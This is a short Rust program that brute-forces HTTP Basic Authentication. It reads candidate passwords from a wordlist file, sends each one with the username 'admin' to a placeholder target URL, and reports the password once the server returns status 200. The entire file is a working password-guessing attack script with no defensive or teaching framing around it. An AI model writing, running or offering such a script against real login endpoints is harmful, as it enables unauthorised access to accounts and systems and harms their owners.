use std::fs::File;
use std::io::{self, BufRead};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let username = "admin";
    let url = "https://Target.com/";
    let wordlist_path = "wordlist.txt";

    let file = File::open(wordlist_path)?;
    let reader = io::BufReader::new(file);
    let mut count = 0;

    for line in reader.lines() {
        count += 1;
        let password = line?.trim().to_string();

        let response = ureq::get(url)
            .set("Authorization", &basic_auth(username, &password))
            .call();

        match response {
            Ok(resp) if resp.status() == 200 => {
                println!("[+] Status code 200 detected. The password is {}", password);
                println!("Password was found in line {} of the wordlist", count);
                break;
            }
            _ => continue,
        }
    }

    Ok(())
}

fn basic_auth(username: &str, password: &str) -> String {
    let credentials = format!("{}:{}", username, password);
    let encoded = base64::encode(credentials);
    format!("Basic {}", encoded)
}
